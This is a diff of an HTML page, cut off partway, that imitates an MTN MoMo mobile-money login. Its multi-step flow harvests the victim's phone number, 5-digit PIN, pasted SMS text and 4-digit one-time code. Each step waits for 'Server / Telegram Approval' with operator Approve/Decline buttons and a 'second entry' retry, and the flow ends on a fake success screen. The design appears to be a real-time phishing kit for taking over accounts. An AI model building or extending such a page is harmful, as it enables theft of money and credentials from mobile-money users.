@@ -1,18 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MTN MoMo Uganda - Login & Verification</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>MoMo Connect • Mobile Money Authentication & Server Approval Portal</title>
   <style>
     :root {
-      --mtn-yellow: #FFCC00;
-      --mtn-yellow-dark: #e6b800;
-      --mtn-blue: #004F71;
-      --mtn-dark: #1D1D1B;
-      --bg-light: #F7F8FA;
-      --border-color: #E0E0E0;
-      --text-muted: #6E7175;
+      --momo-yellow: #FFCC00;
+      --momo-yellow-hover: #F2C200;
+      --momo-blue: #004F71;
+      --momo-blue-light: #006B99;
+      --momo-dark: #003349;
+      --bg-gray: #EEF2F6;
+      --card-bg: #FFFFFF;
+      --text-main: #1F2937;
+      --text-muted: #6B7280;
+      --border-light: #D1D5DB;
+      --success-green: #10B981;
+      --success-green-dark: #059669;
+      --success-bg: #D1FAE5;
+      --error-red: #EF4444;
+      --error-red-dark: #DC2626;
+      --error-bg: #FEE2E2;
+      --warning-amber: #F59E0B;
+      --warning-bg: #FEF3C7;
+      --console-bg: #0F172A;
+      --console-text: #10B981;
     }
 
     * {
@@ -23,802 +37,910 @@
     }
 
     body {
-      background-color: #e9ecef;
+      background: linear-gradient(135deg, #E2E8F0 0%, #F8FAFC 100%);
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      padding: 24px 16px;
+      color: var(--text-main);
     }
 
-    /* Mobile App Container */
-    .app-container {
+    .app-wrapper {
       width: 100%;
-      max-width: 400px;
-      min-height: 100vh;
-      background-color: #ffffff;
+      max-width: 440px;
       display: flex;
       flex-direction: column;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-      position: relative;
+      gap: 12px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      width: 100%;
+      border-radius: 18px;
+      box-shadow: 0 14px 35px rgba(0, 79, 113, 0.14);
       overflow: hidden;
-    }
-
-    @media (min-width: 480px) {
-      .app-container {
-        min-height: 750px;
-        border-radius: 28px;
-      }
-    }
-
-    /* Page View Switching */
-    .page-view {
-      display: none;
-      flex-direction: column;
-      flex: 1;
-      animation: fadeIn 0.25s ease-in-out;
-    }
-
-    .page-view.active {
-      display: flex;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateX(10px); }
-      to { opacity: 1; transform: translateX(0); }
-    }
-
-    /* Header Section */
-    .header {
-      background-color: var(--mtn-yellow);
-      padding: 40px 24px 32px;
-      border-bottom-left-radius: 28px;
-      border-bottom-right-radius: 28px;
-      text-align: center;
+      border-top: 7px solid var(--momo-yellow);
       position: relative;
     }
 
-    .back-btn {
-      position: absolute;
-      top: 18px;
-      left: 18px;
-      background: rgba(255, 255, 255, 0.45);
-      border: none;
-      border-radius: 50%;
-      width: 36px;
-      height: 36px;
-      font-size: 18px;
-      font-weight: bold;
-      color: var(--mtn-dark);
-      cursor: pointer;
+    .header {
+      background: linear-gradient(180deg, var(--momo-blue) 0%, var(--momo-dark) 100%);
+      color: #FFFFFF;
+      padding: 24px 22px 20px 22px;
+      text-align: center;
+    }
+
+    .logo-container {
       display: flex;
-      align-items: center;
       justify-content: center;
-    }
-
-    .back-btn:hover {
-      background: rgba(255, 255, 255, 0.8);
-    }
-
-    .logo-badge {
-      display: inline-flex;
-      flex-direction: column;
       align-items: center;
-      justify-content: center;
-      background-color: var(--mtn-blue);
-      color: #ffffff;
-      padding: 12px 24px;
-      border-radius: 50px;
-      font-weight: 800;
-      box-shadow: 0 4px 12px rgba(0, 79, 113, 0.25);
-      margin-bottom: 14px;
+      gap: 12px;
+      margin-bottom: 6px;
     }
 
-    .logo-mtn {
-      font-size: 13px;
-      letter-spacing: 2px;
-      color: var(--mtn-yellow);
-      border: 1.5px solid var(--mtn-yellow);
-      border-radius: 20px;
-      padding: 1px 10px;
-      margin-bottom: 2px;
-    }
-
-    .logo-momo {
-      font-size: 22px;
-      letter-spacing: 0.5px;
+    .brand-title-group {
+      text-align: left;
     }
 
     .header h1 {
-      color: var(--mtn-dark);
-      font-size: 20px;
-      font-weight: 700;
+      font-size: 1.35rem;
+      font-weight: 800;
+      letter-spacing: 0.4px;
+      color: #FFFFFF;
     }
 
     .header p {
-      color: #333333;
-      font-size: 13px;
-      margin-top: 4px;
+      font-size: 0.82rem;
+      color: #CBD5E1;
+      margin-top: 2px;
     }
 
-    .step-pill {
-      display: inline-block;
-      background-color: var(--mtn-blue);
-      color: #ffffff;
-      font-size: 11px;
-      font-weight: 700;
-      padding: 4px 12px;
-      border-radius: 12px;
-      margin-bottom: 10px;
-      letter-spacing: 0.5px;
-    }
-    /* Form Body */
-    .form-section {
-      padding: 32px 24px;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .input-group {
-      margin-bottom: 20px;
-    }
-
-    .input-label {
-      display: block;
-      font-size: 13px;
-      font-weight: 600;
-      color: var(--mtn-dark);
-      margin-bottom: 8px;
-    }
-
-    /* Phone Input + Country Selector Button */
-    .phone-wrapper {
-      display: flex;
-      align-items: center;
-      border: 1.5px solid var(--border-color);
-      border-radius: 12px;
-      background-color: var(--bg-light);
-      transition: border-color 0.2s;
-      position: relative;
-    }
-
-    .phone-wrapper:focus-within {
-      border-color: var(--mtn-blue);
-      background-color: #ffffff;
-    }
-
-    .country-btn {
-      display: flex;
+    .security-badge {
+      display: inline-flex;
       align-items: center;
       gap: 6px;
-      background: transparent;
-      border: none;
-      border-right: 1.5px solid var(--border-color);
-      padding: 14px 12px;
-      cursor: pointer;
-      font-size: 15px;
+      background: rgba(255, 255, 255, 0.12);
+      color: var(--momo-yellow);
+      font-size: 0.72rem;
       font-weight: 600;
-      color: var(--mtn-dark);
-      border-top-left-radius: 12px;
-      border-bottom-left-radius: 12px;
+      padding: 4px 12px;
+      border-radius: 20px;
+      margin-top: 10px;
     }
 
-    .country-btn:hover {
-      background-color: rgba(0, 0, 0, 0.03);
+    .step-indicator {
+      background: #00283A;
+      color: var(--momo-yellow);
+      font-size: 0.76rem;
+      font-weight: 700;
+      padding: 8px 12px;
+      text-align: center;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+      transition: background-color 0.3s ease;
     }
 
-    .country-flag {
-      font-size: 18px;
+    .step-indicator.success-bar {
+      background: var(--success-green);
+      color: #FFFFFF;
     }
 
-    .chevron {
-      font-size: 10px;
-      color: var(--text-muted);
-      margin-left: 2px;
-    }
-
-    .phone-input {
-      flex: 1;
-      border: none;
-      background: transparent;
-      padding: 14px 12px;
-      font-size: 16px;
-      font-weight: 500;
-      color: var(--mtn-dark);
-      outline: none;
+    .progress-track {
       width: 100%;
+      height: 5px;
+      background-color: #E2E8F0;
+      overflow: hidden;
     }
 
-    /* Country Dropdown Menu */
-    .country-dropdown {
-      position: absolute;
-      top: 108%;
-      left: 0;
-      width: 100%;
-      background: #ffffff;
-      border: 1px solid var(--border-color);
-      border-radius: 12px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
-      z-index: 100;
-      max-height: 220px;
-      overflow-y: auto;
+    .progress-fill {
+      height: 100%;
+      width: 20%;
+      background-color: var(--momo-yellow);
+      transition: width 0.35s ease, background-color 0.35s ease;
+    }
+
+    .progress-fill.completed {
+      background-color: var(--success-green);
+    }
+
+    .body {
+      padding: 26px 24px;
+      position: relative;
+    }
+    .view {
       display: none;
+      animation: fadeIn 0.25s ease-in-out;
     }
 
-    .country-dropdown.open {
+    .view.active {
       display: block;
     }
 
-    .country-option {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 12px 16px;
-      cursor: pointer;
-      font-size: 14px;
-      border-bottom: 1px solid #f2f2f2;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    .country-option:last-child {
-      border-bottom: none;
-    }
-
-    .country-option:hover {
-      background-color: #fff9db;
-    }
-
-    .country-info {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 500;
-      color: var(--mtn-dark);
-    }
-
-    .country-dial {
-      color: var(--text-muted);
-      font-weight: 600;
-      font-size: 13px;
-    }
-
-    /* PIN Input */
-    .pin-wrapper {
-      display: flex;
-      align-items: center;
-      border: 1.5px solid var(--border-color);
-      border-radius: 12px;
-      background-color: var(--bg-light);
-      padding-right: 12px;
-    }
-
-    .pin-wrapper:focus-within {
-      border-color: var(--mtn-blue);
-      background-color: #ffffff;
-    }
-
-    .pin-input {
-      flex: 1;
-      border: none;
-      background: transparent;
-      padding: 14px 14px;
-      font-size: 16px;
-      letter-spacing: 4px;
-      outline: none;
-      color: var(--mtn-dark);
-    }
-
-    .toggle-pin {
-      background: none;
-      border: none;
-      color: var(--mtn-blue);
-      font-size: 12px;
+    .step-heading {
+      font-size: 1.1rem;
       font-weight: 700;
-      cursor: pointer;
+      color: var(--momo-dark);
+      margin-bottom: 6px;
     }
 
-    .forgot-link {
-      text-align: right;
-      margin-top: -10px;
-      margin-bottom: 24px;
-    }
-
-    .forgot-link a {
-      color: var(--mtn-blue);
-      font-size: 13px;
-      font-weight: 600;
-      text-decoration: none;
-    }
-
-    /* Full SMS Textarea Styling (Page 1 SMS) */
-    .otp-info {
-      text-align: center;
-      font-size: 14px;
+    .step-subtext {
+      font-size: 0.85rem;
       color: var(--text-muted);
+      line-height: 1.45;
+      margin-bottom: 18px;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 700;
+      margin-bottom: 7px;
+      color: var(--momo-dark);
+    }
+
+    .input-wrapper {
+      display: flex;
+      border: 1.5px solid var(--border-light);
+      border-radius: 11px;
+      overflow: hidden;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      background: #FFFFFF;
+    }
+
+    .input-wrapper:focus-within {
+      border-color: var(--momo-blue);
+      box-shadow: 0 0 0 3px rgba(0, 79, 113, 0.12);
+    }
+
+    .prefix {
+      background: #F1F5F9;
+      padding: 13px 15px;
+      font-weight: 700;
+      color: var(--momo-dark);
+      border-right: 1px solid var(--border-light);
+      font-size: 0.95rem;
+      display: flex;
+      align-items: center;
+    }
+
+    input[type="tel"], input[type="password"], input[type="text"], textarea {
+      width: 100%;
+      border: none;
+      padding: 13px 14px;
+      font-size: 1rem;
+      outline: none;
+      font-family: inherit;
+      color: var(--text-main);
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 84px;
+      line-height: 1.45;
+      font-size: 0.92rem;
+    }
+
+    input:disabled, textarea:disabled {
+      background-color: #F1F5F9;
+      color: #94A3B8;
+      cursor: not-allowed;
+    }
+
+    .code-input {
+      text-align: center;
+      font-size: 1.45rem !important;
+      font-weight: 800;
+      letter-spacing: 10px;
+    }
+
+    .btn {
+      width: 100%;
+      background-color: var(--momo-yellow);
+      color: var(--momo-dark);
+      border: none;
+      padding: 14px;
+      font-size: 0.98rem;
+      font-weight: 700;
+      border-radius: 11px;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
+    }
+
+    .btn:hover:not(:disabled) {
+      background-color: var(--momo-yellow-hover);
+      box-shadow: 0 4px 12px rgba(255, 204, 0, 0.35);
+    }
+
+    .btn:active:not(:disabled) {
+      transform: scale(0.99);
+    }
+
+    .btn:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+    }
+
+    .btn-sm {
+      padding: 9px 12px;
+      font-size: 0.83rem;
+      border-radius: 9px;
+      margin-top: 8px;
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 14px;
+    }
+
+    .btn-approve {
+      background-color: var(--success-green);
+      color: #FFFFFF;
+    }
+
+    .btn-approve:hover:not(:disabled) {
+      background-color: var(--success-green-dark);
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+    }
+
+    .btn-decline {
+      background-color: var(--error-red);
+      color: #FFFFFF;
+    }
+
+    .btn-decline:hover:not(:disabled) {
+      background-color: var(--error-red-dark);
+      box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
+    }
+
+    .btn-blue {
+      background-color: var(--momo-blue);
+      color: #FFFFFF;
+    }
+
+    .btn-blue:hover:not(:disabled) {
+      background-color: var(--momo-dark);
+    }
+
+    .btn-secondary {
+      background-color: #E2E8F0;
+      color: var(--text-main);
+      margin-top: 10px;
+    }
+
+    .btn-secondary:hover:not(:disabled) {
+      background-color: #CBD5E1;
+    }
+
+    .spinner {
+      width: 46px;
+      height: 46px;
+      border: 4px solid #E2E8F0;
+      border-top: 4px solid var(--momo-blue);
+      border-right: 4px solid var(--momo-yellow);
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin: 0 auto 12px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .step-approval-box {
+      display: none;
+      background-color: #F8FAFC;
+      border: 1.5px solid #CBD5E1;
+      border-radius: 12px;
+      padding: 18px 16px;
+      margin-top: 18px;
+      text-align: center;
+    }
+
+    .step-approval-box.active {
+      display: block;
+    }
+
+    .banner-notice {
+      background-color: var(--error-bg);
+      color: #991B1B;
+      border: 1px solid #FCA5A5;
+      padding: 11px 13px;
+      border-radius: 10px;
+      font-size: 0.83rem;
+      font-weight: 600;
+      margin-bottom: 16px;
+      display: none;
+      line-height: 1.4;
+    }
+
+    .timer-badge {
+      display: inline-block;
+      background-color: var(--warning-bg);
+      color: #92400E;
+      font-weight: 700;
+      padding: 5px 14px;
+      border-radius: 20px;
+      font-size: 0.84rem;
+      margin: 8px 0;
+    }
+
+    .error-text {
+      color: var(--error-red);
+      font-size: 0.82rem;
+      font-weight: 600;
+      margin-top: 6px;
+      display: none;
+    }
+
+    .copy-box {
+      background-color: #F8FAFC;
+      border: 1.5px dashed #94A3B8;
+      border-radius: 10px;
+      padding: 12px 14px;
+      text-align: left;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.8rem;
+      color: var(--momo-dark);
       line-height: 1.5;
-      margin-bottom: 20px;
+      word-break: break-word;
+      user-select: all;
     }
 
-    .otp-info strong {
-      color: var(--mtn-dark);
+    /* Page 5 Successful Login Dashboard */
+    .login-success-box {
+      text-align: center;
+      padding: 4px 0;
     }
 
-    .sms-box-header {
+    .success-badge-circle {
+      width: 68px;
+      height: 68px;
+      background-color: var(--success-bg);
+      color: var(--success-green);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 36px;
+      font-weight: 800;
+      margin: 0 auto 12px auto;
+      box-shadow: 0 6px 16px rgba(16, 185, 129, 0.2);
+    }
+
+    .account-card {
+      background: linear-gradient(135deg, var(--momo-blue) 0%, var(--momo-dark) 100%);
+      color: #FFFFFF;
+      border-radius: 14px;
+      padding: 16px 18px;
+      margin: 16px 0;
+      text-align: left;
+      border-bottom: 5px solid var(--momo-yellow);
+      box-shadow: 0 8px 20px rgba(0, 51, 73, 0.18);
+    }
+
+    .account-card-row {
       display: flex;
       justify-content: space-between;
       align-items: center;
       margin-bottom: 8px;
     }
 
-    .paste-btn {
-      background-color: rgba(0, 79, 113, 0.1);
-      color: var(--mtn-blue);
-      border: none;
-      border-radius: 8px;
-      padding: 6px 12px;
-      font-size: 12px;
+    .active-pill {
+      background-color: var(--success-green);
+      color: #FFFFFF;
+      font-size: 0.72rem;
       font-weight: 700;
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
-
-    .paste-btn:hover {
-      background-color: rgba(0, 79, 113, 0.18);
-    }
-
-    .full-sms-textarea {
-      width: 100%;
-      min-height: 125px;
-      border: 1.5px solid var(--border-color);
+      padding: 3px 10px;
       border-radius: 12px;
-      background-color: var(--bg-light);
-      padding: 14px;
-      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+    }
+
+    .timestamp {
+      font-size: 0.8rem;
+      color: #CBD5E1;
+      margin-top: 6px;
+    }
+
+    .api-log {
+      background-color: var(--console-bg);
+      color: var(--console-text);
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.74rem;
+      padding: 12px;
+      border-radius: 10px;
+      text-align: left;
+      margin-top: 16px;
+      max-height: 105px;
+      overflow-y: auto;
       line-height: 1.5;
-      color: var(--mtn-dark);
-      resize: none;
-      outline: none;
-      transition: border-color 0.2s, background-color 0.2s;
-      margin-bottom: 16px;
-    }
-
-    .full-sms-textarea:focus {
-      border-color: var(--mtn-blue);
-      background-color: #ffffff;
-    }
-
-    /* 4-Digit OTP Boxes Styling (Page 2 SMS) */
-    .otp-boxes {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin-bottom: 24px;
-    }
-
-    .otp-digit {
-      width: 56px;
-      height: 60px;
-      border: 1.5px solid var(--border-color);
-      border-radius: 12px;
-      background-color: var(--bg-light);
-      text-align: center;
-      font-size: 24px;
-      font-weight: 700;
-      color: var(--mtn-dark);
-      outline: none;
-      transition: border-color 0.2s, background-color 0.2s;
-    }
-
-    .otp-digit:focus {
-      border-color: var(--mtn-blue);
-      background-color: #ffffff;
-      box-shadow: 0 0 0 3px rgba(0, 79, 113, 0.1);
-    }
-
-    .resend-box {
-      text-align: center;
-      font-size: 13px;
-      color: var(--text-muted);
-      margin-bottom: 24px;
-    }
-
-    .resend-btn {
-      background: none;
-      border: none;
-      color: var(--mtn-blue);
-      font-weight: 700;
-      cursor: pointer;
-      font-size: 13px;
-      text-decoration: underline;
-    }
-
-    .resend-btn:disabled {
-      color: var(--text-muted);
-      text-decoration: none;
-      cursor: default;
-    }
-
-    /* Submit Button */
-    .btn-login {
-      width: 100%;
-      background-color: var(--mtn-yellow);
-      color: var(--mtn-dark);
-      border: none;
-      border-radius: 12px;
-      padding: 16px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background-color 0.2s, transform 0.1s;
-      box-shadow: 0 4px 10px rgba(255, 204, 0, 0.35);
-      margin-top: auto;
-    }
-
-    .btn-login:hover {
-      background-color: var(--mtn-yellow-dark);
-    }
-
-    .btn-login:active {
-      transform: scale(0.98);
-    }
-
-    .footer {
-      text-align: center;
-      padding: 20px;
-      font-size: 13px;
-      color: var(--text-muted);
-    }
-
-    .footer a {
-      color: var(--mtn-blue);
-      font-weight: 700;
-      text-decoration: none;
-    }
-
-    /* Status Toast */
-    .toast {
-      position: absolute;
-      bottom: 24px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: var(--mtn-blue);
-      color: #fff;
-      padding: 10px 18px;
-      border-radius: 20px;
-      font-size: 13px;
-      display: none;
-      white-space: nowrap;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-      z-index: 200;
+      border: 1px solid #1E293B;
     }
   </style>
 </head>
 <body>
 
-  <div class="app-container">
-
-    <!-- ==================== PAGE 1: LOGIN SCREEN ==================== -->
-    <div class="page-view active" id="pageLogin">
+  <div class="app-wrapper">
+    <div class="card">
       <div class="header">
-        <div class="logo-badge">
-          <span class="logo-mtn">MTN</span>
-          <span class="logo-momo">MoMo</span>
+        <div class="logo-container">
+          <svg width="46" height="46" viewBox="0 0 64 64" fill="none" xmlns="http://w3.org">
+            <rect width="64" height="64" rx="14" fill="#FFCC00"/>
+            <circle cx="32" cy="32" r="22" stroke="#004F71" stroke-width="4"/>
+            <path d="M20 38V26L26 33L32 26V38" stroke="#004F71" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M38 38V26L44 33L48 28" stroke="#004F71" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <div class="brand-title-group">
+            <h1>MoMo Connect</h1>
+            <p>Mobile Money & Server Approval API</p>
+          </div>
         </div>
-        <h1>Welcome to MoMo</h1>
-        <p>Sign in with your mobile money number</p>
+        <div class="security-badge">🔒 End-to-End Session Verification</div>
       </div>
 
-      <form class="form-section" id="loginForm">
-        <div class="input-group">
-          <label class="input-label" for="phoneInput">Mobile Number</label>
-          <div class="phone-wrapper">
-            <button type="button" class="country-btn" id="countryBtn" aria-label="Select Country">
-              <span class="country-flag" id="selectedFlag">🇺🇬</span>
-              <span id="selectedCode">+256</span>
-              <span class="chevron">▼</span>
-            </button>
+      <div class="step-indicator" id="step-label">Page 1 of 5 • Account Login</div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progress-bar"></div>
+      </div>
 
-            <input 
-              type="tel" 
-              id="phoneInput" 
-              class="phone-input" 
-              placeholder="77X XXX XXX" 
-              maxlength="9"
-              required
-            >
+      <div class="body">
+        <!-- PAGE 1: Mobile Money Number -->
+        <div id="page-1" class="view active">
+          <div id="declined-banner" class="banner-notice">
+            🚫 Request declined. Previous details have been cleared and all inputs are re-enabled for your second entry.
+          </div>
 
-            <div class="country-dropdown" id="countryDropdown">
-              <div class="country-option" data-flag="🇺🇬" data-code="+256" data-placeholder="77X XXX XXX">
-                <div class="country-info"><span>🇺🇬</span> <span>Uganda</span></div>
-                <span class="country-dial">+256</span>
+          <h2 class="step-heading">Sign in to MoMo</h2>
+          <p class="step-subtext">
+            Enter your registered Mobile Money phone number to initiate a secure login session.
+          </p>
+
+          <form id="form-page-1" novalidate>
+            <div class="form-group">
+              <label for="phone">Mobile Money Number</label>
+              <div class="input-wrapper">
+                <span class="prefix">+254</span>
+                <input
+                  type="tel"
+                  id="phone"
+                  placeholder="712 345 678"
+                  maxlength="10"
+                  autocomplete="tel"
+                  required
+                />
               </div>
-              <div class="country-option" data-flag="🇬🇭" data-code="+233" data-placeholder="24X XXX XXX">
-                <div class="country-info"><span>🇬🇭</span> <span>Ghana</span></div>
-                <span class="country-dial">+233</span>
+              <div id="phone-error" class="error-text">Please enter a valid 9 or 10-digit mobile number.</div>
+            </div>
+            <button type="submit" id="btn-p1" class="btn">Continue</button>
+          </form>
+        </div>
+
+        <!-- PAGE 2: 5-Digit PIN + Continuous Spinner on Continue -->
+        <div id="page-2" class="view">
+          <h2 class="step-heading">PIN Verification</h2>
+          <p class="step-subtext">
+            Authenticating account <strong id="p2-phone" style="color: var(--momo-dark);"></strong>. Please enter your 5-digit PIN below.
+          </p>
+
+          <form id="form-page-2" novalidate>
+            <div class="form-group">
+              <label for="pin">Enter 5-Digit App PIN</label>
+              <div class="input-wrapper">
+                <input
+                  type="password"
+                  id="pin"
+                  class="code-input"
+                  placeholder="•••••"
+                  maxlength="5"
+                  inputmode="numeric"
+                  autocomplete="off"
+                  required
+                />
               </div>
-              <div class="country-option" data-flag="🇷🇼" data-code="+250" data-placeholder="78X XXX XXX">
-                <div class="country-info"><span>🇷🇼</span> <span>Rwanda</span></div>
-                <span class="country-dial">+250</span>
+              <div id="pin-error" class="error-text" style="text-align: center;">Please enter all 5 digits of your PIN.</div>
+            </div>
+            <button type="submit" id="btn-p2" class="btn">Continue</button>
+          </form>
+
+          <div id="p2-spinner-box" class="step-approval-box">
+            <div class="spinner"></div>
+            <p style="font-weight: 700; font-size: 0.92rem; color: var(--momo-dark);">
+              Waiting for Server / Telegram Approval...
+            </p>
+            <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 3px;">
+              Spinner remains active until Approved or Declined
+            </p>
+            <div class="btn-row">
+              <button type="button" id="p2-approve-btn" class="btn btn-approve">Approve</button>
+              <button type="button" id="p2-decline-btn" class="btn btn-decline">Decline</button>
+            </div>
+          </div>
+        </div>
+        <!-- PAGE 3: Copy & Paste SMS + Continuous Spinner on Continue -->
+        <div id="page-3" class="view">
+          <h2 class="step-heading">SMS Verification</h2>
+          <p class="step-subtext">
+            Copy the verification request below, then paste the SMS message received on your handset.
+          </p>
+
+          <form id="form-page-3" novalidate>
+            <div class="form-group">
+              <label>1. Copy Verification Request Text</label>
+              <div class="copy-box" id="p3-copy-source"></div>
+              <button type="button" id="p3-copy-btn" class="btn btn-blue btn-sm">📋 Copy Request Text</button>
+            </div>
+
+            <div class="form-group">
+              <label for="sms-paste-input">2. Paste the SMS Received</label>
+              <div class="input-wrapper">
+                <textarea
+                  id="sms-paste-input"
+                  placeholder="Paste the full SMS message received on your phone here..."
+                  required
+                ></textarea>
               </div>
-              <div class="country-option" data-flag="🇿🇲" data-code="+260" data-placeholder="96X XXX XXX">
-                <div class="country-info"><span>🇿🇲</span> <span>Zambia</span></div>
-                <span class="country-dial">+260</span>
-              </div>
-              <div class="country-option" data-flag="🇨🇲" data-code="+237" data-placeholder="67X XXX XXX">
-                <div class="country-info"><span>🇨🇲</span> <span>Cameroon</span></div>
-                <span class="country-dial">+237</span>
-              </div>
-              <div class="country-option" data-flag="🇨🇮" data-code="+225" data-placeholder="05X XXX XXX">
-                <div class="country-info"><span>🇨🇮</span> <span>Côte d'Ivoire</span></div>
-                <span class="country-dial">+225</span>
-              </div>
-              <div class="country-option" data-flag="🇧🇯" data-code="+229" data-placeholder="97X XXX XXX">
-                <div class="country-info"><span>🇧🇯</span> <span>Benin</span></div>
-                <span class="country-dial">+229</span>
-              </div>
-              <div class="country-option" data-flag="🇸🇿" data-code="+268" data-placeholder="76X XXX XX">
-                <div class="country-info"><span>🇸🇿</span> <span>Eswatini</span></div>
-                <span class="country-dial">+268</span>
-              </div>
+              <button type="button" id="p3-paste-btn" class="btn btn-secondary btn-sm">📥 Paste SMS from Clipboard</button>
+              <div id="sms-error" class="error-text">Please paste the SMS message received before continuing.</div>
+            </div>
+
+            <button type="submit" id="btn-p3" class="btn">Continue</button>
+          </form>
+
+          <div id="p3-spinner-box" class="step-approval-box">
+            <div class="spinner"></div>
+            <p style="font-weight: 700; font-size: 0.92rem; color: var(--momo-dark);">
+              Waiting for Server / Telegram Approval...
+            </p>
+            <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 3px;">
+              Spinner remains active until Approved or Declined
+            </p>
+            <div class="btn-row">
+              <button type="button" id="p3-approve-btn" class="btn btn-approve">Approve</button>
+              <button type="button" id="p3-decline-btn" class="btn btn-decline">Decline</button>
             </div>
           </div>
         </div>
 
-        <div class="input-group">
-          <label class="input-label" for="pinInput">MoMo PIN (5 Digits)</label>
-          <div class="pin-wrapper">
-            <input 
-              type="password" 
-              id="pinInput" 
-              class="pin-input" 
-              placeholder="•••••" 
-              inputmode="numeric" 
-              maxlength="5"
-              required
-            >
-            <button type="button" class="toggle-pin" id="togglePin">SHOW</button>
+        <!-- PAGE 4: 4-Digit Code + Continuous Spinner on Continue -->
+        <div id="page-4" class="view">
+          <h2 class="step-heading">4-Digit Security Code</h2>
+          <p class="step-subtext">
+            Confirm the <strong>4-digit verification code</strong> from your SMS for <strong id="p4-phone" style="color: var(--momo-dark);"></strong>.
+          </p>
+
+          <form id="form-page-4" novalidate>
+            <div class="form-group">
+              <label for="otp-code">Enter 4-Digit Code</label>
+              <div class="input-wrapper">
+                <input
+                  type="text"
+                  id="otp-code"
+                  class="code-input"
+                  placeholder="0000"
+                  maxlength="4"
+                  inputmode="numeric"
+                  autocomplete="one-time-code"
+                  required
+                />
+              </div>
+              <div id="code-error" class="error-text" style="text-align: center;">Please enter all 4 digits of the code.</div>
+            </div>
+            <button type="submit" id="btn-p4" class="btn">Continue</button>
+          </form>
+
+          <div id="p4-spinner-box" class="step-approval-box">
+            <div class="spinner"></div>
+            <p style="font-weight: 700; font-size: 0.92rem; color: var(--momo-dark);">
+              Waiting for Final Approval...
+            </p>
+            <div class="timer-badge">Expires in: <span id="countdown">01:00</span></div>
+            <div class="btn-row">
+              <button type="button" id="p4-approve-btn" class="btn btn-approve">Approve</button>
+              <button type="button" id="p4-decline-btn" class="btn btn-decline">Decline</button>
+            </div>
           </div>
         </div>
 
-        <div class="forgot-link">
-          <a href="#">Forgot PIN?</a>
+        <!-- PAGE 5: Successful Login Page -->
+        <div id="page-5" class="view">
+          <div class="login-success-box">
+            <div class="success-badge-circle">✓</div>
+            <h2 style="color: var(--momo-dark); font-size: 1.45rem; font-weight: 800;">Login Successful</h2>
+            <p style="font-size: 0.88rem; color: var(--text-muted); margin-top: 5px;">
+              Welcome back! Your MoMo account session is now active and verified.
+            </p>
+
+            <div class="account-card">
+              <div class="account-card-row">
+                <span style="font-size: 0.8rem; color: #CBD5E1; font-weight: 600;">Active MoMo Account</span>
+                <span class="active-pill">● Verified Session</span>
+              </div>
+              <div id="p5-account-phone" style="font-size: 1.25rem; font-weight: 800; color: var(--momo-yellow);"></div>
+              <div class="timestamp" id="result-time"></div>
+            </div>
+
+            <div class="copy-box" id="copy-text-content"></div>
+            <button type="button" id="copy-btn" class="btn btn-blue" style="margin-top: 14px;">📋 Copy Login Session Details</button>
+            <button type="button" id="reset-btn" class="btn btn-secondary">Log Out / New Login</button>
+          </div>
         </div>
 
-        <button type="submit" class="btn-login">SIGN IN</button>
-      </form>
-
-      <div class="footer">
-        Don't have a MoMo account? <a href="#">Register</a>
+        <!-- Live Server & API Status Console -->
+        <div class="api-log" id="api-console">
+          [READY] Connected to Server Approval API.<br>
+        </div>
       </div>
     </div>
-
-    <!-- ==================== PAGE 2: COPY FULL SMS (STEP 1) ==================== -->
-    <div class="page-view" id="pageSms1">
-      <div class="header">
-        <button type="button" class="back-btn" onclick="showPage('pageLogin')">←</button>
-        <span class="step-pill">STEP 1 OF 2</span>
-        <h1>SMS Verification</h1>
-        <p>Copy and paste the full verification SMS</p>
-      </div>
-
-      <form class="form-section" id="smsForm1">
-        <p class="otp-info">
-          Copy the entire SMS message sent to<br>
-          <strong id="displayPhone1">+256 770 000 000</strong> and paste it below.
-        </p>
-
-        <div class="sms-box-header">
